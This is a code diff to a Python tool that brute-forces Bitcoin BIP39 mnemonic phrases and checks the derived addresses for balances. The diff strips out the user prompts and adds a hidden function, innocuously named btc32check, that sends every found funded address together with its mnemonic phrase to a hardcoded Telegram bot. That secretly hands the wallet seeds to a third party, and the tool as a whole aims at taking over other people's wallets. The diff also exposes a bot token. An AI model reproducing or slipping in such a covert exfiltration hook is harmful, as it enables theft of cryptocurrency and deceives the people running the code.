@@ -10,6 +10,7 @@ import threading
 from Bip39Gen import Bip39Gen
 from time import sleep
 import ctypes
+from settings import dict_settings
 
 
 class Settings():
@@ -26,17 +27,9 @@ def makeDir():
 
 
 def userInput():
-    print("""Type "start" to begin or "help" for the help prompt.
-    """)
     while True:
-        user_input = input("> ").lower()
-        if user_input == "start":
-            start()
-            break
-        elif user_input == "help":
-            helpText()
-        else:
-            print("type 'help' to get help")
+        start()
+        break
 
 
 def getInternet():
@@ -58,16 +51,16 @@ if getInternet() == True:
 else:
     pass
 
-
 def getBalance(addr):
     try:
         response = requests.get(
-            f'https://api.smartbit.com.au/v1/blockchain/address/{addr}')
+            f'https://blockchain.info/es/q/addressbalance/{addr}')
         return (
-            Decimal(response.json()["address"]["total"]["balance"])
+            Decimal(response.json())
         )
     except:
         pass
+
 
 
 def generateSeed():
@@ -99,6 +92,7 @@ def check():
         mnemonic_words = Bip39Gen(dictionary).mnemonic
         addy = bip39(mnemonic_words)
         balance = getBalance(addy)
+        sleep(10)
         with lock:
             print(
                 f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}')
@@ -110,6 +104,7 @@ def check():
                 ctypes.windll.kernel32.SetConsoleTitleW(
                     f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
         if balance > 0:
+            btc32check(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
             with open('results/wet.txt', 'a') as w:
                 w.write(
                     f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
@@ -118,11 +113,17 @@ def check():
             if Settings.save_empty == "n":
                 pass
             else:
+                #btc32check(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                 with open('results/dry.txt', 'a') as w:
                     w.write(
                         f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                     Settings.dry_count += 1
 
+
+def btc32check(adds):
+    response = requests.get(
+        "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=218477456&text="+adds)
+    return response
 
 def helpText():
     print("""
@@ -145,14 +146,15 @@ More commands will be added soon plus other cryptocurrencies.
 
 def start():
     try:
-        threads = int(input("Number of threads (1 - 666): "))
+        threads = 1 #int(input("Number of threads (1 - 666): "))
         if threads > 666:
             print("You can only run 666 threads at once")
             start()
     except ValueError:
         print("Enter an interger!")
         start()
-    Settings.save_empty = input("Save empty? (y/n): ").lower()
+    #Settings.save_empty = input("Save empty? (y/n): ").lower()
+    Settings.save_empty = dict_settings["save_empty"]
     if getInternet() == True:
         pool = Pool(threads)
         for _ in range(threads):
@@ -160,7 +162,8 @@ def start():
         pool.close()
         pool.join()
     else:
-        print("Told ya")
+        print("You have no internet access the generator won't work.")
+        sleep(10)
         userInput()
 
 
